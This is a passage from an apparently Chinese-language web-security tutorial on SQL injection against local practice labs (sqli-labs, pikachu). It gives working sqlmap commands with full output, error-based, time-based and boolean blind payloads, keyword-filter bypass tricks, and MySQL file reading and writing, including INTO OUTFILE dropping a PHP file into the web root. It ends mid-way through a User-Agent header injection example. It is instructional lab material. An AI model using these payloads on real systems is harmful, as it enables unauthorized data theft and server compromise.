[20:23:13] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:23:13] [INFO] POST parameter 'passwd' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
POST parameter 'passwd' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 381 HTTP(s) requests:
---
Parameter: passwd (POST)
    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=&passwd=") OR (SELECT 5753 FROM(SELECT COUNT(*),CONCAT(0x7170767671,(SELECT (ELT(5753=5753,1))),0x716b717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ("wTnR"="wTnR&submit=Submit
---
[20:23:15] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[20:23:15] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 20:23:15 /2020-03-04/

                                                                                                                                              
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364
```

#### BURPSUITE的简单使用

**Burp Suite**是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。
用BURPSUITE修改请求头进行双引号错误的测试演示如下：
（1）配置BURPSUITE和浏览器：



<iframe id="5SG6yr7u-1583981561948" src="https://player.youku.com/embed/XNDU4NDE2NDY4MA==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

BURPSUITE config



（2）进行BURPSUITE的请求测试：



<iframe id="GEYcUumJ-1583981822725" src="https://player.youku.com/embed/XNDU4NDE2Njk1Ng==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

BURPSUITE test



（3）修改器请求头测试双引号错误：



<iframe id="QWSp3Taj-1583981641448" src="https://player.youku.com/embed/XNDU4NDE2ODgyNA==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

BURPSUITE request



### 2.POST基于时间的盲注

在存在注入点POST提交的参数后加

```sql
and (select (if(length(database())>5,sleep(5),null))) -- 
1
```

如果执行的页面响应时间大于5秒，肯定就存在注入，并且对应的SQL语句执行。
先进行测试，如下：
![SQL Injection POST time 1](https://img-blog.csdnimg.cn/20200305124120502.gif#pic_center)
显然，虽然没有明确的报错信息，但是还是可以区分正常和错误的请求。
用户名输入**admin’ and (select (if(length(database())>5,sleep(5),null))) –** ，密码随便输入，提交：
![SQL Injection POST time 2](https://img-blog.csdnimg.cn/20200305124141767.gif#pic_center)
显然，请求延迟了5秒，说明存在注入点。

#### sqlmap安全测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data="uname=admin&passwd=123" --current-db --technique T
1
```

打印

```shell
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:46:34 /2020-03-04/

[20:46:34] [INFO] testing connection to the target URL
[20:46:34] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:46:34] [WARNING] heuristic (basic) test shows that POST parameter 'uname' might not be injectable
[20:46:34] [INFO] testing for SQL injection on POST parameter 'uname'
[20:46:34] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:46:34] [WARNING] time-based comparison requires larger statistical model, please wait............................ (done)
[20:46:45] [INFO] POST parameter 'uname' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[20:46:55] [INFO] checking if the injection point on POST parameter 'uname' is a false positive
POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 39 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 8829 FROM (SELECT(SLEEP(5)))PxOu) AND 'Bvhj'='Bvhj&passwd=123
---
[20:47:15] [INFO] the back-end DBMS is MySQL
[20:47:15] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
back-end DBMS: MySQL >= 5.0.12
[20:47:15] [INFO] fetching current database
[20:47:15] [INFO] retrieved:
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]

[20:47:31] [INFO] adjusting time delay to 1 second due to good response times
security
current database: 'security'
[20:47:52] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 20:47:52 /2020-03-04/

                                                                                                                                     
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647
```

显然，探测出当前的数据库。

### 3.POST基于布尔的盲注

在存在注入点POST提交的参数后加入if判断语句

```sql
select ascii(substr(database(),1,1)) < N;
1
```

用户名输入**admin’ and (length(database())>10) –** ，密码随便输入，提交：
![SQL Injection POST boolean](https://img-blog.csdnimg.cn/20200305124213213.gif#pic_center)
存在注入点。

#### sqlmap安全测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data="uname=admin&passwd=123" --current-db --technique B
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [)]     | .'| . |                                                                                                                                 
|___|_  [)]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 20:49:40 /2020-03-04/                                                                                                                      
                                                                                                                                                          
[20:49:40] [INFO] testing connection to the target URL                                                                                                    
[20:49:40] [INFO] checking if the target is protected by some kind of WAF/IPS                                                                             
[20:49:40] [INFO] testing if the target URL content is stable                                                                                             
[20:49:41] [INFO] target URL content is stable                                                                                                            
[20:49:41] [INFO] testing if POST parameter 'uname' is dynamic                                                                                            
[20:49:41] [WARNING] POST parameter 'uname' does not appear to be dynamic                                                                                 
[20:49:41] [WARNING] heuristic (basic) test shows that POST parameter 'uname' might not be injectable                                                     
[20:49:41] [INFO] testing for SQL injection on POST parameter 'uname'                                                                                     
[20:49:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                              
[20:49:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                      
[20:49:41] [WARNING] POST parameter 'uname' does not seem to be injectable                                                                                
[20:49:41] [INFO] testing if POST parameter 'passwd' is dynamic                                                                                           
[20:49:41] [WARNING] POST parameter 'passwd' does not appear to be dynamic                                                                                
[20:49:41] [WARNING] heuristic (basic) test shows that POST parameter 'passwd' might not be injectable                                                    
[20:49:41] [INFO] testing for SQL injection on POST parameter 'passwd'                                                                                    
[20:49:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                              
[20:49:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                      
[20:49:41] [WARNING] POST parameter 'passwd' does not seem to be injectable                                                                               
[20:49:41] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform m
ore tests. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you 
could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'                                                         
                                                                                                                                                          
[*] ending @ 20:49:41 /2020-03-04/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                                                                                                                                                         
12345678910111213141516171819202122232425262728293031323334353637
```

显然，此时未探测出当前的数据库，需要进一步探测。

## 三、SQL注入绕过手段

如果程序中设置了过滤关键字,但是过滤过程中并没有对关键字组成进行深入分析过滤,导致只是对整体进行过滤。
例如：出现**and**过滤，这种过滤只是发现关键字出现才会过滤，并不会对关键字处理，所以可以采取一些措施绕过。

### 1.大小写绕过

通过修改关键字内字母大小写来绕过过滤措施。
例如：

> and 改为 AnD或ANd
> order by 改为 OrDEr bY

### 2.双写绕过

如果在程序中设置出现关键字之后替换为空，那么SQL注入攻击也不会发生。
对于这样的过滤策略可以使用双写绕过，因为在过滤过程中只进行了一次替换，还剩下一个关键字可以继续探测注入。
例如：

> and 改为 aandnd
> or 改为 oorr

### 3.编码绕过

可以利用URL编码工具绕过SQL注入的过滤机制。
例如：
可以将[http://127.0.0.1/sqli-labs/Less-5/?id=1’ AND 3835=3835 AND ‘YqTv’='YqTv --+](http://127.0.0.1/sqli-labs/Less-5/?id=1' AND 3835=3835 AND 'YqTv'='YqTv -- )改为[http://127.0.0.1/sqli-labs/less-5/?id=1%27%20and%203835=3835%20and%20%27yqtv%27=%27yqtv%20–+](http://127.0.0.1/sqli-labs/less-5/?id=1' and 3835=3835 and 'yqtv'='yqtv -- )。
可以在HackBar或者http://tool.chinaz.com/Tools/urlencode.aspx中进行URL编码。

### 4.内联注释绕过

在MySQL中内联注释中的内容可以被当做SQL语句执行。
例如：

```sql
/*!select*/ * from users;
1
```

打印

```sql
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 13 | admin4   | admin4     |
| 14 | admin5   | admin5     |
+----+----------+------------+
14 rows in set (0.00 sec)     
12345678910111213141516171819
```

即被内联注释掉的SQL语句也能正常执行。

# Python全栈（五）Web安全攻防之7.MySQL注入读写文件和HTTP头中的SQL注入

## 一、MySQL注入读写文件

### 1.搭建新的测试环境（靶场）

**pikachu**是一个比较详细的漏洞平台，是使用php搭建的，需要php环境和mysql数据库支持。
可点击https://download.csdn.net/download/CUFEECR/12230045下载后解压并拷贝到phpstudy下的**WWW**目录下，便可以开始测试了。
安装和初始化步骤如下：
![pikachu安装和配置](https://img-blog.csdnimg.cn/20200310194816609.gif#pic_center)
由于配置文件中已经将初始参数等设置好，所以可以不用修改、直接使用。
可以在**pikachu**上进行注入测试。

### 2.读写文件概述

MySQL数据库在渗透过程中能够使用的功能很多，除了读取数据，还可以对文件进行读写。
读写的前提：

- 用户权限足够高,尽量具有root权限
- `secure_file_priv`不为null

### 3.读取文件

SQL中查询

```sql
show global variables like 'secure_file_priv';
1
```

打印

```sql
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv | NULL  |
+------------------+-------+
1 row in set, 1 warning (0.01 sec)
123456
```

默认为Null，需要在配置文件中进行配置：
在 **[mysqld]** 下增加一行`secure_file_priv=`，即设置`secure_file_priv`为空（不同于Null），重启mysql，再次查询，结果为

```sql
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set, 1 warning (0.01 sec)
123456
```

此时变为空，可以进行文件读取。
MySQL读取文件用`load_file()`函数。
读取文件：

```sql
select load_file('XXXX\target.txt');
1
```

打印

```sql
+-------------------------------------------------+
| load_file('XXXX\target.txt') |
+-------------------------------------------------+
| NULL                                            |
+-------------------------------------------------+
1 row in set (0.00 sec)
123456
```

此时读取文件为空，说明还存在问题，需要将路径改为\\，再次进行测试：

~~~sql
select load_file('XXXX\\target.txt');```
打印
```sql

+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| load_file('XXXX\\target.txt')




                                                                 |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| POST /sqli-labs/Less-12/ HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive
Content-Length: 28
Pragma: no-cache
Cache-Control: no-cache
Origin: http://127.0.0.1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Referer: http://127.0.0.1/sqli-labs/Less-12/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKXFpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF

uname=&passwd=&submit=Submit |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.00 sec)

123456789101112131415161718192021222324252627282930313233343536
~~~

此时即可正常读取文件。
访问[http://127.0.0.1/sqli-labs/Less-1/?id=-1’ union select 1,load_file(‘C:\Users\Lenovo\Desktop\target.txt’),3 --+](http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,load_file('C:\\Users\\Lenovo\\Desktop\\target.txt'),3 -- )，显示：
![SQL load_file](https://img-blog.csdnimg.cn/2020031019522660.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
读取出文档中的内容。

### 4.写入文件

查看写入文件选项：

```sql
show variables like '%general%';
1
```

打印

```sql
+------------------+-----------------------------------------------------------------------+
| Variable_name    | Value                                                                 |
+------------------+-----------------------------------------------------------------------+
| general_log      | OFF                                                                   |
| general_log_file | XXXX\MySQL\phpstudy_pro\Extensions\MySQL5.7.26\data\LAPTOP-61GNXXXX.log |
+------------------+-----------------------------------------------------------------------+
2 rows in set, 1 warning (0.01 sec)
1234567
```

默认为关闭。
开启文件写入：

```sql
set global general_log = on;
1
```

打印

```sql
Query OK, 0 rows affected (0.00 sec)
1
```

此时再查询，打印：

```sql
+------------------+-----------------------------------------------------------------------+
| Variable_name    | Value                                                                 |
+------------------+-----------------------------------------------------------------------+
| general_log      | ON                                                                    |
| general_log_file | XXXX\MySQL\phpstudy_pro\Extensions\MySQL5.7.26\data\LAPTOP-61GNXXXX.log |
+------------------+-----------------------------------------------------------------------+
2 rows in set, 1 warning (0.00 sec)
1234567
```

显然，打开了文件写入，并且保存在**E:\MySQL\phpstudy_pro\Extensions\MySQL5.7.26\data\LAPTOP-61GNXXXX.log**之下。
写入文件用`into outfile`。
SQL测试：

```sql
select * from users into outfile 'XXXX\\users.txt';
1
```

打印

```sql
Query OK, 14 rows affected (0.00 sec)
1
```

此时，桌面生成users.txt文件，内容为：

> 1 Dumb Dumb
> 2 Angelina I-kill-you
> 3 Dummy p@ssword
> 4 secure crappy
> 5 stupid stupidity
> 6 superman genious
> 7 batman mob!le
> 8 admin admin
> 9 admin1 admin1
> 10 admin2 admin2
> 11 admin3 admin3
> 12 dhakkan dumbo
> 13 admin4 admin4
> 14 admin5 admin5

访问[http://127.0.0.1/sqli-labs/Less-7/?id=1’)) union select 1,’’,3 into outfile ‘E:\MySQL\phpstudy_pro\WWW\sqli-labs\Less-7\1.php’ --+](http://127.0.0.1/sqli-labs/Less-7/?id=1')) union select 1,'',3 into outfile 'E:\\MySQL\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\1.php' -- )，显示：
![SQL into outfile](https://img-blog.csdnimg.cn/20200310195410449.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
虽然报错，但是可以看到php路径下的sqli-libs下的less-7下已经出现了1.php，内容为：

> 1 Dumb Dumb
> 1 <?php phpinfo(); ?> 3

访问http://127.0.0.1/sqli-labs/Less-7/1.php，可以看到：
![SQL into outfile 1.php](https://img-blog.csdnimg.cn/20200310195451476.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
显然，会暴露很多关于php的信息，可能存在安全风险。
sqlmap测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-7/?id=1 --file-read "XXXX\\target.txt"
1
```

打印

```shell
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:08:08 /2020-03-05/

[20:08:08] [INFO] testing connection to the target URL
[20:08:08] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:08:08] [INFO] testing if the target URL content is stable
[20:08:09] [INFO] target URL content is stable
[20:08:09] [INFO] testing if GET parameter 'id' is dynamic
[20:08:09] [WARNING] GET parameter 'id' does not appear to be dynamic
[20:08:09] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[20:08:09] [INFO] testing for SQL injection on GET parameter 'id'
[20:08:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:08:09] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="are")
[20:08:10] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[20:08:15] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:08:15] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:08:15] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:08:15] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:08:15] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[20:08:15] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[20:08:15] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:08:15] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:08:15] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:08:15] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:08:15] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[20:08:15] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[20:08:15] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:08:15] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[20:08:15] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[20:08:16] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[20:08:16] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[20:08:16] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[20:08:16] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[20:08:16] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[20:08:16] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[20:08:16] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[20:08:16] [INFO] testing 'Generic inline queries'
[20:08:16] [INFO] testing 'MySQL inline queries'
[20:08:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[20:08:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[20:08:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[20:08:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[20:08:16] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[20:08:16] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[20:08:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:08:26] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[20:08:26] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:08:26] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:08:26] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[20:08:27] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[20:08:27] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[20:08:28] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[20:08:28] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[20:08:29] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[20:08:29] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[20:08:29] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[20:08:30] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[20:08:30] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[20:08:31] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 284 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1') AND 1379=1379 AND ('FhWh'='FhWh

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1') AND (SELECT 1975 FROM (SELECT(SLEEP(5)))AHJv) AND ('IFMc'='IFMc
---
[20:08:46] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[20:08:46] [INFO] fingerprinting the back-end DBMS operating system
[20:08:46] [INFO] the back-end DBMS operating system is Windows
[20:08:46] [INFO] fetching file: 'C:/Users/Lenovo/Desktop/target.txt'
[20:08:46] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[20:08:46] [INFO] retrieved: 504F5354202F73716C692D6C6162732F4C6573732D31322F20485454502F312E310D0A486F73743A203132372E302E302E310D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A436F6E74656E742D4C656E6774683A2032380D0A507261676D613A206E6F2D63616368650D0A43616368652D436F6E74726F6C3A206E6F2D63616368650D0A4F726967696E3A20687474703A2F2F3132372E302E302E310D0A557067726164652D496E7365637572652D52657175657374733A20310D0A436F6E74656E742D547970653A206170706C69636174696F6E2F782D7777772D666F726D2D75726C656E636F6465640D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F7773204E542031302E303B20574F57363429204170706C655765624B69742F3533372E333620284B48544D4C2C206C696B65204765636B6F29204368726F6D652F38302E302E333938372E313136205361666172692F3533372E33360D0A5365632D46657463682D446573743A20646F63756D656E740D0A4163636570743A20746578742F68746D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C6170706C69636174696F6E2F786D6C3B713D302E392C696D6167652F776562702C696D6167652F61706E672C2A2F2A3B713D302E382C6170706C69636174696F6E2F7369676E65642D65786368616E67653B763D62333B713D302E390D0A5365632D46657463682D536974653A2073616D652D6F726967696E0D0A5365632D46657463682D4D6F64653A206E617669676174650D0A5365632D46657463682D557365723A203F310D0A526566657265723A20687474703A2F2F3132372E302E302E312F73716C692D6C6162732F4C6573732D31322F0D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174652C2062720D0A4163636570742D4C616E67756167653A207A682D434E2C7A683B713D302E390D0A436F6F6B69653A2063737266746F6B656E3D6764687352524738434F586D556D636F524276626332353972596E62504B584670456967674F485146394D5A784D6B6D427358387A6176564379755742376F460D0A0D0A756E616D653D267061737377643D267375626D69743D5375626D6974 do you want confirmation that the remote file 'XXXX/target.txt' has been successfully downloaded from the back-end DBMS file system? [Y/n]

[20:27:00] [INFO] retrieved:
[20:27:00] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[20:27:00] [WARNING] unexpected HTTP code 'None' detected. Will use (extra) validation step in similar cases
[20:27:00] [WARNING] unexpected HTTP code '200' detected. Will use (extra) validation step in similar cases
832
[20:27:00] [INFO] the local file 'XXX\sqlmap\output\127.0.0.1\files\C__Users_Lenovo_Desktop_target.txt' and the remote file 'C:/Users/Lenovo/Desktop/target.txt' have the same size (832 B)
files saved to [1]:
[*] XXX\sqlmap\output\127.0.0.1\files\C__Users_Lenovo_Desktop_target.txt (same file)

[20:27:00] [INFO] fetched data logged to text files under 'XXX\sqlmap\output\127.0.0.1'

[*] ending @ 20:27:00 /2020-03-05/


123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106
```

读取到的内容被保存到XXX\sqlmap\output\127.0.0.1\files目录下的**XXXX_target.txt**。

## 二、HTTP头中的SQL注入

### 1.HTTP头中的SQL注入介绍

在安全意识越来越重视的情况下，很多网站都在防止漏洞的发生。
例如SQL注入中用户提交的参数都会被代码中的某些措施进行过滤；
过滤掉用户直接提交的参数，但是对于HTTP头中提交的内容很有可能就没有进行过滤。

#### updatexml函数

`UPDATEXML(XML_document, XPath_string, new_value);`
参数说明：

- **XML_document**是String格式，为XML文档对象的名称，文中为Doc
- **XPath_string**是Xpath格式的字符串
- **new_value**是String格式，替换查找到的符合条件的数据

### 2.HTTP头中的User-Agent注入

访问http://127.0.0.1/sqli-labs/Less-18/，显示：
![sqli less 18](https://img-blog.csdnimg.cn/20200310195927343.gif#pic_center)
显示出IP地址和浏览器User-Agent。
测试出闭合单引号：

```sql
select * from users where id = '1' or '1' = '1';
1
```

打印

```sql
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 13 | admin4   | admin4     |
| 14 | admin5   | admin5     |
+----+----------+------------+
14 rows in set (0.00 sec)     
12345678910111213141516171819
```

在user-agent后加入`' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) or '1' = '1`，测试use-agent注入，操作如下：
![HTTP user-agent injection version](https://img-blog.csdnimg.cn/20200310195955841.gif#pic_center)
预览显示：
